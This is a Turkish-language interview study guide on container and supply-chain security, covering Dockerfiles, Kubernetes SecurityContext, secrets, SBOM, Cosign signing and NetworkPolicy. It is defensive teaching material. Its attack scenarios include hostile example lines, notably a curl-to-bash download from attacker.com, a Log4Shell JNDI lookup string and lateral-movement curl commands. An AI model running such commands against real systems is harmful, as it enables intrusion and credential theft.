# 09f — Container & Supply Chain Güvenliği: Mülakat Soruları & Gerçek Hayat Sorunları

---

## Bölüm 1: Container İmaj Güvenliği

### Gerçek Hayat Sorunları

---

**Sorun 1: `ubuntu:latest` base image — 300+ CVE, saldırı yüzeyi devasa**

```
Senaryo:
  Ekip: "Spring Boot uygulaması için hızlıca Dockerfile yazalım."

  FROM ubuntu:latest
  RUN apt-get update && apt-get install -y openjdk-17-jdk curl wget bash
  COPY app.jar app.jar
  CMD ["java", "-jar", "app.jar"]

  Trivy taraması:
    trivy image myapp:latest
    Total: 312 vulnerabilities (CRITICAL: 18, HIGH: 87, MEDIUM: 147, LOW: 60)

  CVE-2023-44487 (HTTP/2 Rapid Reset): CRITICAL — curl paketi dahil
  CVE-2023-4911 (Glibc buffer overflow): CRITICAL — glibc dahil
  ...

  Saldırı senaryosu:
    Uygulama'da RCE (Remote Code Execution) bulundu.
    Saldırgan: bash, curl, wget → mevcut.
    curl http://attacker.com/malware | bash → çalıştırdı.
    wget ile tool indirdi, persisted.
    Container içinden lateral movement başladı.

Distroless ile fark:
  FROM gcr.io/distroless/java21
  COPY --chown=nonroot:nonroot app.jar /app/app.jar
  USER nonroot
  ENTRYPOINT ["java", "-jar", "/app/app.jar"]

  Trivy taraması:
    Total: 7 vulnerabilities (HIGH: 2, MEDIUM: 5)
    CRITICAL: 0

  Saldırı senaryosu (distroless):
    RCE başarılı oldu.
    bash yok → shell çalıştıramıyor.
    curl, wget yok → dışarıdan tool indiremiyor.
    Package manager yok → ek yazılım yükleyemiyor.
    Saldırı: büyük ölçüde sınırlandı.

Pratikte geçiş:
  ubuntu → eclipse-temurin:21-jre-alpine   (ilk adım, küçük imaj)
  alpine → gcr.io/distroless/java21         (ikinci adım, güvenli)
  
  distroless debug: gcr.io/distroless/java21:debug → busybox shell var
  (sadece debug için, production'da :debug tag kullanma)
```

---

**Sorun 2: Root user container — container escape ile host'a root erişim**

```
Senaryo:
  Dockerfile'da USER direktifi yok → container root olarak çalışıyor.

  Kubernetes cluster'da CVE-2022-0185 (Linux kernel privilege escalation).
  Saldırgan: container içinde uygulama RCE buldu.
  Container root olarak çalıştığı için:
    Host network namespace'e erişti.
    /proc/sysrq-trigger → host'u etkiledi.
    Container escape: /proc/sys/kernel → host kernel parametrelerine yazdı.
  Sonuç: Node'un tüm kontrolü ele geçirildi.

Non-root Dockerfile:
  FROM eclipse-temurin:21-jre-alpine

  RUN addgroup -S appgroup && adduser -S appuser -G appgroup

  COPY --chown=appuser:appgroup app.jar /app/app.jar

  USER appuser    # UID = örn. 1001

  ENTRYPOINT ["java", "-jar", "/app/app.jar"]

Kubernetes SecurityContext (enforce et):
  securityContext:
    runAsNonRoot: true              # root user → pod başlamaz
    runAsUser: 10001                # explicit UID
    runAsGroup: 10001
    allowPrivilegeEscalation: false # sudo/setuid yasak
    readOnlyRootFilesystem: true    # dosya sistemi read-only
    capabilities:
      drop: [ALL]                   # tüm Linux capabilities kaldır
      add: [NET_BIND_SERVICE]       # sadece gereken

  readOnlyRootFilesystem:
    Uygulama /tmp'ye yazmak isteyebilir → emptyDir volume:
    volumes:
      - name: tmp-dir
        emptyDir: {}
    volumeMounts:
      - name: tmp-dir
        mountPath: /tmp

Admission Controller (OPA/Kyverno) ile cluster-wide enforce:
  ClusterPolicy: tüm pod'larda runAsNonRoot: true zorunlu.
  İhlal → pod başlamaz → developer uyarı alır.
```

---

**Sorun 3: Secret environment variable olarak → image history'de göründü**

```
Senaryo:
  Dockerfile:
    ENV DB_PASSWORD=Sup3rS3cr3t!   # YANLIŞ!
    ENV API_KEY=sk-prod-12345

  docker history myapp:latest:
    IMAGE     CREATED   CREATED BY                    SIZE
    abc123    5 min ago /bin/sh -c #(nop) ENV DB_P…   0B
    → "ENV DB_PASSWORD=Sup3rS3cr3t!" görünüyor!

  docker image inspect myapp:latest:
    "Env": ["DB_PASSWORD=Sup3rS3cr3t!", "API_KEY=sk-prod-12345"]

  Sonuç:
    Registry'de imaj → herkese açık (public registry ise) → secret açık.
    Dahili registry: erişimi olan herkes → secret çıkarabilir.
    docker pull → docker inspect → şifreler.

K8s Secret ile doğru yönetim:
  # 1. K8s Secret oluştur (etcd encryption at rest aktif olmalı):
  kubectl create secret generic app-secrets \
    --from-literal=DB_PASSWORD="Sup3rS3cr3t!" \
    --from-literal=API_KEY="sk-prod-12345"

  # 2. Pod spec — env var olarak mount (kabul edilebilir):
  env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: DB_PASSWORD

  # 3. Daha iyi — volume mount (env var process listesinde görünmez):
  volumeMounts:
    - name: secrets-vol
      mountPath: /secrets
      readOnly: true
  volumes:
    - name: secrets-vol
      secret:
        secretName: app-secrets

  Uygulama: Files.readString(Path.of("/secrets/DB_PASSWORD"))

  # 4. En iyi — Vault Agent Injector (sidecar):
  # Vault Agent → uygulama başlamadan önce secret çeker → /secrets'e yazar
  # K8s Secret bile oluşturulmaz → etcd'ye gitmez.

  Sealed Secrets (Bitnami) — Git-ops uyumlu:
    kubeseal → SealedSecret (şifreli) → Git'e commit edilebilir.
    Cluster controller → decrypt → K8s Secret.
    Şifreli hali public repo'da bile güvenli.
```

---

**Sorun 4: Multi-stage build yok — build araçları production imajında**

```
Senaryo:
  Tek stage Dockerfile:
    FROM maven:3.9-eclipse-temurin-21
    WORKDIR /app
    COPY . .
    RUN mvn package -DskipTests
    ENTRYPOINT ["java", "-jar", "target/app.jar"]

  İmaj boyutu: 1.2GB
  İçerik: Maven, JDK (compiler dahil), tüm kaynak kodu, .git dizini, test dosyaları.

  Güvenlik açıkları:
    .git dizini: git history → önceki commit'lerde silinmiş secret'lar!
    git log → "remove hardcoded password" commit'i → önceki versiyonda şifre var.
    Maven → local repo (~/.m2) → tüm bağımlılıklar imajda.
    JDK compiler: saldırgan container içinde Java kodu derleyebilir!
    Build log: test config, env var'lar kaynak kodda görünebilir.

Multi-stage build:
  # Stage 1: Build (geçici, production'a gitmez)
  FROM maven:3.9-eclipse-temurin-21 AS builder
  WORKDIR /build
  COPY pom.xml .
  RUN mvn dependency:resolve   # bağımlılık cache (layer)
  COPY src/ src/
  RUN mvn package -DskipTests

  # Stage 2: Runtime (küçük, güvenli)
  FROM eclipse-temurin:21-jre-alpine
  RUN addgroup -S appgroup && adduser -S appuser -G appgroup
  COPY --from=builder /build/target/app.jar /app/app.jar
  COPY --chown=appuser:appgroup --from=builder /build/target/app.jar /app/
  USER appuser
  ENTRYPOINT ["java", "-jar", "/app/app.jar"]

  Sonuç:
    İmaj boyutu: 1.2GB → 180MB.
    Maven, JDK, kaynak kodu, .git → production imajında yok.
    CVE yüzeyi dramatik azaldı.
    Build cache: mvn dependency:resolve ayrı layer → kaynak değişse de bağımlılıklar cache'den.
```

---

## Bölüm 2: Supply Chain Güvenliği

### Gerçek Hayat Sorunları

---

**Sorun 5: Log4Shell — hangi servislerde log4j var? SBOM yoksa saatler sürdü**

```
Senaryo:
  2021 Aralık: CVE-2021-44228 (Log4Shell) — CVSS 10.0 CRITICAL.
  Log4j 2.x: JNDI lookup → ${jndi:ldap://attacker.com/exploit} → RCE.
  
  Güvenlik ekibi: "Hangi servisimizde log4j var?"
  
  SBOM yok:
    100 microservice, her biri farklı ekip.
    Her servis'in pom.xml'ini manuel kontrol: 4 engineer × 6 saat = 24 adam-saat.
    Transitive bağımlılıklar: log4j doğrudan değil, elasticsearch-client → log4j-core.
    gömülü bağımlılık: uber-jar içinde log4j sınıfları → grep gerekli.
    Toplam tespit: 18 saat.
    Bu süre: saldırı riski altında.

  SBOM ile:
    Her build'de CycloneDX SBOM üretildi → merkezi SBOM deposuna yüklendi.
    Güvenlik ekibi: SBOM deposunu "log4j-core" için sorgula.
    Sorgu: 30 saniye. Etkilenen 23 servis listelendi.
    Ekipler patch için bilgilendirildi: toplam 45 dakika.

Maven CycloneDX SBOM entegrasyonu:
  <!-- pom.xml -->
  <plugin>
      <groupId>org.cyclonedx</groupId>
      <artifactId>cyclonedx-maven-plugin</artifactId>
      <version>2.7.11</version>
      <executions>
          <execution>
              <phase>package</phase>
              <goals><goal>makeAggregateBom</goal></goals>
          </execution>
      </executions>
  </plugin>
  <!-- target/bom.json → CI'da SBOM deposuna yükle -->

  CI pipeline:
    mvn package → target/bom.json oluştu.
    dependency-track API → bom.json yükle.
    Dependency Track: CVE match → alert → Slack/Jira otomatik ticket.
```

---

**Sorun 6: Typosquatting — `lodash` yerine `l0dash` kuruldu**

```
Senaryo (gerçek vaka benzeri — event-stream npm):
  Frontend developer: npm install colorama (Python'ı kastetti ama npm'de arıyor)
  npm'de "colorama" var → ama saldırgan tarafından yüklenmiş, zararlı kod içeriyor.
  
  package.json:
    "dependencies": {
      "colorama": "^1.0.0"   // zararlı paket!
    }

  Zararlı kod: postinstall hook → çevre değişkenlerini topla → dış sunucuya gönder.
  AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY → saldırgana gitti.
  CI/CD ortamında: tüm credential'lar çalındı.

Önlemler:

  1. Private registry (JFrog Artifactory / Nexus):
     Tüm bağımlılıklar önce private registry'den çekilir.
     Upstream proxy: public npm/Maven → tarama → private'a kopyala.
     Bilinmeyen paket → kurulum engellendi.

  2. Sürüm pinning (exact version):
     "lodash": "4.17.21"   // DOĞRU — exact
     "lodash": "^4.0.0"    // YANLIŞ — major range
     package-lock.json / yarn.lock → integrity hash:
     sha512-abc123... → değişirse → kurulum başarısız.

  3. npm audit / Snyk:
     npm audit --audit-level=high
     snyk test → bilinen malicious paket tespiti.
     CI'da: audit fail → build durdur.

  4. Scoped packages:
     @company/utils → internal package namespace.
     npm: unscoped "utils" → farklı paket.

  5. Allowlist / Deny list:
     Sadece onaylı paketler kurulabilir (OPA policy).
     Yeni paket → güvenlik review → allowlist'e ekle.

  6. Transitive tarama:
     mvn dependency:tree | grep log4j → tüm bağımlılık ağacı.
     OWASP Dependency Check: transitive dahil CVE tarama.
```

---

**Sorun 7: İmaj imzalanmadı — registry'den zararlı imaj deploy edildi**

```
Senaryo:
  CI pipeline: Docker Hub'dan public image kullanıyordu.
  nginx:latest → güvenilir gibi görünüyor.
  
  Senaryo: registry credential'ı çalındı (ya da man-in-the-middle).
  Saldırgan: "nginx:latest" tag'ını zararlı imajla değiştirdi.
  Kubernetes: yeni pod → zararlı imajı pull etti → çalıştırdı.
  
  Gerçek vaka (CodeCov 2021):
    CodeCov'un Bash uploader betiği → kaynak değiştirildi.
    CI/CD ortamlarında çalıştıran binlerce şirket → credential'lar çalındı.
    Betik imzalanmıyordu → değişiklik fark edilmedi.

Cosign ile imaj imzalama:

  # Build sonrası imzala:
  cosign sign --key cosign.key myregistry.io/myapp:1.0.0-abc123

  # Doğrulama:
  cosign verify --key cosign.pub myregistry.io/myapp:1.0.0-abc123
  # Başarısız → imaj değiştirilmiş veya imzalanmamış → deploy etme!

  Keyless signing (GitHub Actions CI):
  - name: Sign image
    run: cosign sign myregistry.io/myapp:${{ github.sha }}
    env:
      COSIGN_EXPERIMENTAL: "1"
  # GitHub OIDC token → Sigstore Fulcio CA → sertifika → Rekor'a log

  Kyverno ile Kubernetes'te enforce:
  apiVersion: kyverno.io/v1
  kind: ClusterPolicy
  metadata:
    name: require-signed-images
  spec:
    validationFailureAction: Enforce
    rules:
      - name: check-image-signature
        match:
          any:
            - resources:
                kinds: [Pod]
        verify:
          - imageReferences: ["myregistry.io/*"]
            attestors:
              - entries:
                  - keys:
                      publicKeys: |-
                        -----BEGIN PUBLIC KEY-----
                        ...

  İmzasız imaj → Pod admission reddedildi → cluster'a girmedi.
  
  Digest pinning (tag yerine):
    image: nginx:latest          # YANLIŞ — tag değişebilir
    image: nginx@sha256:abc123   # DOĞRU — immutable digest
```

---

**Sorun 8: Network Policy yok — compromised pod tüm cluster'a erişti**

```
Senaryo:
  Frontend pod'unda RCE bulundu (XSS + SSRF kombinasyonu).
  Kubernetes'te Network Policy YOK → varsayılan: tüm pod'lar birbirine erişebilir.

  Saldırgan:
    Frontend pod'undan:
    curl http://payment-service:8080/admin/export-all  → tüm ödeme verileri
    curl http://user-service:8080/users?page=0&size=10000  → tüm kullanıcı verisi
    curl http://postgres:5432  → DB'ye direkt bağlantı denedi
    Kubernetes API server'a: curl https://kubernetes.default.svc → service account token ile

  Lateral movement: frontend → ödeme servisi → kullanıcı servisi → DB.
  Saldırgan bir pod'u ele geçirerek tüm cluster'a ulaştı.

Network Policy ile izolasyon:
  # Varsayılan: tümünü reddet (whitelist yaklaşımı)
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: deny-all
    namespace: production
  spec:
    podSelector: {}
    policyTypes: [Ingress, Egress]

  # Frontend: sadece API Gateway'den gelen isteklere izin ver
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: frontend-policy
  spec:
    podSelector:
      matchLabels:
        app: frontend
    policyTypes: [Ingress, Egress]
    ingress:
      - from:
          - podSelector:
              matchLabels:
                app: api-gateway
        ports:
          - port: 3000
    egress:
      - to:
          - podSelector:
              matchLabels:
                app: api-gateway
        ports:
          - port: 8080
      # DNS (CoreDNS)
      - to: []
        ports:
          - port: 53
            protocol: UDP

  Sonuç: frontend pod'u ele geçirilse bile:
    payment-service: ulaşılamaz (izin yok).
    user-service: ulaşılamaz.
    postgres: ulaşılamaz.
    Lateral movement: engellendi.
```

---

### Mülakat Soruları

**Junior / Mid:**

1. Container güvenliğinde "saldırı yüzeyi azaltma" nedir? Distroless imaj ne sağlar?

   > **Beklened:** Saldırı yüzeyi azaltma: bir saldırganın kullanabileceği giriş noktalarını, araçları, bileşenleri minimize etmek. ubuntu:latest: bash, curl, wget, apt, 300+ paket → saldırgan RCE sonrası bu araçları kullanır. Distroless: sadece uygulama + runtime (JRE). Shell yok → bash ile komut çalıştıramaz. Package manager yok → ek yazılım yükleyemez. CVE yüzeyi: ubuntu JDK 300+ CVE → distroless java 5-10 CVE. Pratik: RCE başarılı olsa bile saldırgan "kör" kalır — ne indirip çalıştıracak aracı yok. Alpine: distroless'tan büyük ama ubuntu'dan çok küçük (5MB vs 80MB base). Debug için: `gcr.io/distroless/java21:debug` — busybox shell var, sadece debug ortamında kullan. Multi-stage ile birlikte: build araçları (Maven, JDK) production imajına hiç girmez.

2. Kubernetes Pod SecurityContext'te hangi ayarlar kritiktir?

   > **Beklened:** `runAsNonRoot: true`: root user → pod başlamaz (enforce). `runAsUser: 10001`: explicit UID, root (0) değil. `allowPrivilegeEscalation: false`: sudo/setuid ile yetki yükseltme yasak. `readOnlyRootFilesystem: true`: container dosya sistemi read-only → saldırgan dosya yazamaz, binary değiştiremez. `capabilities.drop: [ALL]`: tüm Linux kernel yetenekleri kaldır. `add: [NET_BIND_SERVICE]`: sadece gereken yetenekleri ekle (port 80 bind için). `seccompProfile: RuntimeDefault`: sistem çağrısı filtreleme. `resources.limits`: memory/CPU limit → kaynak tüketim saldırısı (DoS) önleme. Neden önemli: container escape → host'a root erişim. Non-root + capabilities drop → escape olsa bile kısıtlı yetki. Admission Controller (Kyverno/OPA): tüm cluster'da policy otomatik enforce.

3. SBOM nedir? Neden her build'de üretilmeli?

   > **Beklened:** SBOM (Software Bill of Materials): uygulamada kullanılan tüm bileşenlerin envanteri — isim, sürüm, lisans, kaynak, bilinen CVE'ler. Formatlar: CycloneDX (OWASP), SPDX (Linux Foundation). Neden her build'de: Log4Shell (2021) gibi kritik CVE çıkınca "hangi servisimizde etkilenen bileşen var?" sorusuna dakikalar içinde cevap. SBOM yoksa: her servis manuel kontrol, transitive bağımlılıklar gözden kaçar, saatler/günler. SBOM ile: merkezi sorgu → 30 saniye → etkilenen servisler. Lisans uyumu: copyleft (GPL) lisanslı kütüphane ticari üründe risk. Tedarik zinciri audit: hangi bağımlılık, hangi sürüm, hangi registry. Maven: cyclonedx-maven-plugin → `target/bom.json`. CI: her build → Dependency Track'e yükle → CVE match → otomatik alert.

4. Supply chain saldırısı nedir? Typosquatting nasıl önlenir?

   > **Beklened:** Supply chain saldırısı: uygulamanın kullandığı bağımlılıklar (npm, Maven, PyPI) veya build araçları üzerinden yapılan saldırı. SolarWinds: build sistemine zararlı kod enjekte. Log4Shell: güvenilir kütüphanede kritik açık. event-stream (npm): maintainer değişti → zararlı kod eklendi. Typosquatting: `lodash` yerine `l0dash`, `request` yerine `requsts` → yazım hatası → zararlı paket. Önlemler: (1) Private registry (Artifactory/Nexus): public registry proxy → tarama → kopyala. Bilinmeyen paket → kurulum engelli. (2) Exact version pinning: `"lodash": "4.17.21"` (not `^4.0.0`). (3) Integrity hash: package-lock.json sha512 kontrolü. (4) npm audit / Snyk: bilinen zararlı paket tespiti. (5) Scoped packages: `@company/utils` → internal namespace. (6) Allowlist policy: sadece onaylı paketler. (7) Transitive tarama: `mvn dependency:tree`.

---

**Senior / Architect:**

5. Image signing (Cosign/Sigstore) neden gereklidir? Keyless signing nasıl çalışır?

   > **Beklened:** Neden: registry'den çekilen imajın gerçekten CI tarafından build edildiği ve değiştirilmediği garanti edilmeli. Tag mutable: `nginx:latest` bugün farklı, yarın farklı imaj olabilir. MITM veya registry credential çalınması → zararlı imaj tag'ı değiştirildi. Cosign: build sonrası imajı private key ile imzalar. Deploy öncesi public key ile doğrulama. Başarısız → deploy etme. Keyless signing (Sigstore): private key yönetimi yok. CI (GitHub Actions) → OIDC token → Sigstore Fulcio CA → sertifika verir. İmza + sertifika → Rekor transparency log'a kaydedilir (immutable). Doğrulama: Rekor'dan sertifika + imza → imajın kim tarafından, ne zaman, hangi CI pipeline'da imzalandığı. Kyverno ClusterPolicy: imzasız imaj → Pod admission reddedilir. Digest pinning: `image: nginx@sha256:abc` → immutable, tag değişiminden etkilenmez.

6. Kubernetes'te secret yönetiminde en güvenli yaklaşım hangisidir? Tradeoff'ları nelerdir?

   > **Beklened:** Seçenekler sırayla: (1) Env var / Dockerfile ENV: en kötü. Process listesinde görünür (`ps aux`), image history'de görünür, log'a sızabilir. (2) K8s Secret (base64): base64 şifreleme değil. etcd encryption at rest aktif edilmeli. RBAC ile kısıtla. `kubectl get secret -o yaml` → base64 decode → şifre. İyileştirme: `--from-file` + volume mount → env var'dan daha iyi. (3) Sealed Secrets (Bitnami): şifreli SealedSecret → Git'e commit edilebilir. Cluster key ile decrypt → K8s Secret. GitOps uyumlu. (4) External Secrets Operator: AWS Secrets Manager / GCP Secret Manager → K8s Secret'a sync. Cloud provider rotation desteği. (5) Vault Agent Injector (en iyi): sidecar → uygulama başlamadan önce Vault'tan çeker → dosyaya yazar. K8s Secret oluşturulmaz → etcd'ye gitmez. Dynamic secret: her pod farklı credential. Lease: TTL sonra otomatik expire. Audit: kim, ne zaman hangi secret'a erişti?

7. Container runtime güvenliği için Falco nasıl kullanılır? NetworkPolicy ile farkı nedir?

   > **Beklened:** NetworkPolicy: ağ trafiğini kontrol eder — "kim kime bağlanabilir?" Layer 3/4 filtreleme. Statik kural: önceden tanımlanmış. Falco: runtime anomaly detection — container çalışırken davranış izler. "Bir process beklenmedik şey yapıyor mu?" Kural örnekleri: container içinde yeni process başlatıldı (RCE şüphesi). `/etc/passwd` veya `/etc/shadow` okundu (credential erişimi). Unexpected outbound connection (veri sızdırma). `chmod` ile executable oluşturuldu. Root shell spawn edildi. Fark: NetworkPolicy — önleyici (prevent). Falco — dedektif (detect). Tamamlayıcı: NetworkPolicy bloklar, Falco gözden kaçanı tespit eder. Entegrasyon: Falco alert → Slack/PagerDuty → otomatik pod isolation (Falcosidekick). Deployment: DaemonSet (her node'da), eBPF probe (kernel-level, düşük overhead). Kural repository: Falco rules YAML — özelleştirilebilir.

---

## Karma — Architect Seviyesi

8. **"Container güvenlik pipeline'ı tasarlıyorsun. Build'den deploy'a kadar hangi kontroller olmalı?"**

   > **Beklened:** Tam pipeline: (1) Code commit: SAST (Semgrep/SonarQube) → güvenlik açığı tarama. Secrets scanning (GitLeaks/TruffleHog) → commit'te secret var mı? (2) Build: Multi-stage Dockerfile → distroless runtime imajı. Non-root user. (3) Image scan (Trivy): `trivy image --exit-code 1 --severity CRITICAL`. CRITICAL → pipeline fail, MEDIUM → report. (4) SBOM üretimi: CycloneDX → Dependency Track'e yükle. CVE match → otomatik Jira ticket. (5) Image signing (Cosign): CI'da keyless sign → Sigstore. (6) Registry push: private registry (ECR, GCR, Harbor). Image tag: git SHA (immutable). (7) GitOps (ArgoCD): manifest'te image digest pin (`@sha256:...`). (8) Admission (Kyverno): imzasız imaj → reject. SecurityContext policy → runAsNonRoot zorunlu. (9) Runtime: Falco DaemonSet → anomaly detect. Network Policy → default deny, whitelist. (10) Monitoring: CVE dashboard (Dependency Track), Falco alert, image age (eski imaj → yenile).

9. **"Log4Shell gibi zero-day çıktı. Ekibini nasıl yönetirsin?"**

   > **Beklened:** T+0 (ilk 30 dakika): SBOM deposunu sorgula → "log4j-core" → etkilenen servis listesi. Severity teyit et: CVSS skoru, exploit mevcut mu? (Log4Shell: CVSS 10, exploit gün içinde). Üst yönetime bildir: etki alanı, tahmini fix süresi. T+1 saat: etkilenen servisleri isolate et (Network Policy ile dış erişimi kıs) veya WAF rule: `${jndi:` pattern → block. Temporary mitigation: `log4j2.formatMsgNoLookups=true` JVM arg ekle → hızlı deploy. T+2 saat: patch versiyonu çık (log4j 2.17.1) → test → deploy. En kritik servisler önce (ödeme, kullanıcı auth). T+4 saat: tüm servisler patch edildi → Trivy tarama → CRITICAL temiz. T+sonra: post-mortem → SBOM süreci zaten vardıysa kazanım belgele. Yoksa → SBOM pipeline kur. Dependabot: log4j güncellemelerini otomatik PR aç. Süreç iyileştirme: "vulnerability → patch → deploy" SLA tanımla (CRITICAL: 24 saat, HIGH: 1 hafta).
